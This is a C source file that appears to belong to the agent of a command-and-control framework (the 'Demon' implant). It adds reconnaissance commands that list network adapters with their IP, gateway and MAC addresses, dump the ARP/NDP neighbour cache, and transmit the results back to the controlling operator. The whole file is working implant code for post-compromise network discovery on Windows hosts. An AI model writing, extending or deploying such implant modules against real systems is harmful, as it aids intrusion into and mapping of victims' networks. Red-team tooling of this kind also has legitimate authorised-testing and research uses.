/*
 * Command_Netinfo.c - HVC-032 network-discovery commands
 *
 * DEMON_NETINFO_ADAPTERS : enumerate network adapters via GetAdaptersInfo and
 *                          report name, description, IP, mask, gateway, and
 *                          MAC address for each adapter.
 *
 * DEMON_NETINFO_ARP      : dump the ARP/NDP neighbour cache via GetIpNetTable2
 *                          and report interface index, address family, IP bytes,
 *                          MAC bytes, and neighbour state for each entry.
 *
 * iphlpapi.h is pulled in transitively via Win32.h -> iphlpapi.h (already
 * included in the build).  MIB_IPNET_TABLE2 / MIB_IPNET_ROW2 live in
 * netioapi.h which MinGW ships as part of iphlpapi.h.
 */

#include <Demon.h>
#include <common/Macros.h>
#include <core/Command.h>
#include <core/Package.h>
#include <core/MiniStd.h>
#include <core/Parser.h>
#include <core/Win32.h>
#include <commands/Command_Netinfo.h>

/* ---- typedefs for all function pointers used in this file ---- */

typedef DWORD (WINAPI *fnGetAdaptersInfo)( PIP_ADAPTER_INFO pAdapterInfo, PULONG pOutBufLen );
typedef DWORD (WINAPI *fnGetIpNetTable2)( ADDRESS_FAMILY Family, PMIB_IPNET_TABLE2 *Table );
typedef VOID  (WINAPI *fnFreeMibTable)( PVOID Memory );

/* ----------------------------------------------------------------
 * CommandNetinfo
 *   DataArgs - parser positioned after the CommandID field.
 *              Layout: SubCommand(int32)
 * ---------------------------------------------------------------- */
VOID CommandNetinfo( IN PPARSER DataArgs )
{
    PPACKAGE Package    = PackageCreate( DEMON_COMMAND_NETINFO );
    SHORT    SubCommand = (SHORT) ParserGetInt32( DataArgs );

    /* Echo back the sub-command so the client can route the response. */
    PackageAddInt32( Package, SubCommand );

    switch ( SubCommand )
    {

        /* --------------------------------------------------------
         * DEMON_NETINFO_ADAPTERS
         * Enumerate network adapters via GetAdaptersInfo.
         * Each adapter is reported as a group of fields followed
         * by a zero-length sentinel to mark end-of-list.
         * -------------------------------------------------------- */
        case DEMON_NETINFO_ADAPTERS: PUTS( "Netinfo::Adapters" )
        {
            PIP_ADAPTER_INFO AdapBuf = NULL;
            PIP_ADAPTER_INFO Cur     = NULL;
            ULONG            BufLen  = 0;
            DWORD            Ret     = 0;

            if ( ! Instance->Win32.GetAdaptersInfo )
            {
                PUTS( "Netinfo::Adapters - GetAdaptersInfo not available" )
                PackageAddInt32( Package, 0 );
                break;
            }

            /* First call to discover the required buffer size. */
            BufLen = sizeof( IP_ADAPTER_INFO ) * 16;
            AdapBuf = (PIP_ADAPTER_INFO) MmHeapAlloc( BufLen );
            if ( ! AdapBuf )
            {
                PUTS( "Netinfo::Adapters - MmHeapAlloc failed" )
                PackageAddInt32( Package, 0 );
                break;
            }

            Ret = ( (fnGetAdaptersInfo) Instance->Win32.GetAdaptersInfo )( AdapBuf, &BufLen );

            if ( Ret == ERROR_BUFFER_OVERFLOW )
            {
                /* Reallocate with the exact size the API reported. */
                MmHeapFree( AdapBuf );
                AdapBuf = NULL;

                AdapBuf = (PIP_ADAPTER_INFO) MmHeapAlloc( BufLen );
                if ( ! AdapBuf )
                {
                    PUTS( "Netinfo::Adapters - MmHeapAlloc (resize) failed" )
                    PackageAddInt32( Package, 0 );
                    break;
                }

                Ret = ( (fnGetAdaptersInfo) Instance->Win32.GetAdaptersInfo )( AdapBuf, &BufLen );
            }

            if ( Ret != ERROR_SUCCESS )
            {
                PRINTF( "Netinfo::Adapters - GetAdaptersInfo failed: %lu\n", Ret )
                PackageAddInt32( Package, 0 );
                MmHeapFree( AdapBuf );
                break;
            }

            /* Walk the adapter linked list. */
            Cur = AdapBuf;
            while ( Cur )
            {
                /* Adapter GUID name (ASCII). */
                PackageAddString( Package, Cur->AdapterName );
                /* Human-readable description (ASCII). */
                PackageAddString( Package, Cur->Description );
                /* Primary IP address and subnet mask (dotted-decimal ASCII). */
                PackageAddString( Package, Cur->IpAddressList.IpAddress.String );
                PackageAddString( Package, Cur->IpAddressList.IpMask.String );
                /* Default gateway (dotted-decimal ASCII). */
                PackageAddString( Package, Cur->GatewayList.IpAddress.String );
                /* Raw MAC bytes - length is in AddressLength (typically 6). */
                if ( Cur->AddressLength > 0 )
                {
                    PackageAddBytes( Package, (PBYTE) Cur->Address, Cur->AddressLength );
                }
                else
                {
                    /* No MAC - emit a zero-length byte field so the client parse stays in sync. */
                    PackageAddBytes( Package, (PBYTE) Cur->Address, 0 );
                }

                Cur = Cur->Next;
            }

            /* Zero sentinel - client stops parsing adapters when it reads this. */
            PackageAddInt32( Package, 0 );

            MmHeapFree( AdapBuf );
            AdapBuf = NULL;
            break;
        }

        /* --------------------------------------------------------
         * DEMON_NETINFO_ARP
         * Dump the ARP / NDP neighbour table via GetIpNetTable2.
         * Each row is reported as a group of fields followed by a
         * zero-length sentinel to mark end-of-list.
         * -------------------------------------------------------- */
        case DEMON_NETINFO_ARP: PUTS( "Netinfo::Arp" )
        {
            PMIB_IPNET_TABLE2 Table = NULL;
            DWORD             Ret   = 0;
            ULONG             i     = 0;

            if ( ! Instance->Win32.GetIpNetTable2 || ! Instance->Win32.FreeMibTable )
            {
                PUTS( "Netinfo::Arp - GetIpNetTable2 not available" )
                PackageAddInt32( Package, 0 );
                break;
            }

            /* AF_UNSPEC returns both IPv4 and IPv6 entries. */
            Ret = ( (fnGetIpNetTable2) Instance->Win32.GetIpNetTable2 )( AF_UNSPEC, &Table );

            if ( Ret != NO_ERROR || ! Table )
            {
                PRINTF( "Netinfo::Arp - GetIpNetTable2 failed: %lu\n", Ret )
                PackageAddInt32( Package, 0 );
                break;
            }

            /* Walk the flat row array. */
            for ( i = 0; i < Table->NumEntries; i++ )
            {
                PMIB_IPNET_ROW2 Row = &Table->Table[ i ];

                /* Interface index. */
                PackageAddInt32( Package, Row->InterfaceIndex );

                /* Address family so the client knows how many IP bytes to read. */
                PackageAddInt32( Package, (DWORD) Row->Address.si_family );

                if ( Row->Address.si_family == AF_INET )
                {
                    /* IPv4 - 4 bytes. */
                    PackageAddBytes( Package, (PBYTE) &Row->Address.Ipv4.sin_addr, 4 );
                }
                else if ( Row->Address.si_family == AF_INET6 )
                {
                    /* IPv6 - 16 bytes. */
                    PackageAddBytes( Package, (PBYTE) &Row->Address.Ipv6.sin6_addr, 16 );
                }
                else
                {
                    /* Unknown family - emit a zero-length byte field. */
                    PackageAddBytes( Package, (PBYTE) &Row->Address.Ipv6.sin6_addr, 0 );
                }

                /* Physical (MAC) address - length is in PhysicalAddressLength. */
                if ( Row->PhysicalAddressLength > 0 )
                {
                    PackageAddBytes( Package, (PBYTE) Row->PhysicalAddress, Row->PhysicalAddressLength );
                }
                else
                {
                    PackageAddBytes( Package, (PBYTE) Row->PhysicalAddress, 0 );
                }

                /* Neighbour state (NlnsReachable, NlnsStale, etc.). */
                PackageAddInt32( Package, (DWORD) Row->State );
            }

            /* Zero sentinel - client stops parsing rows when it reads this. */
            PackageAddInt32( Package, 0 );

            ( (fnFreeMibTable) Instance->Win32.FreeMibTable )( Table );
            Table = NULL;
            break;
        }

        default:
            PRINTF( "Netinfo: unknown sub-command %d\n", SubCommand )
            PackageAddInt32( Package, 0 );
            break;
    }

    PackageTransmit( Package );
}
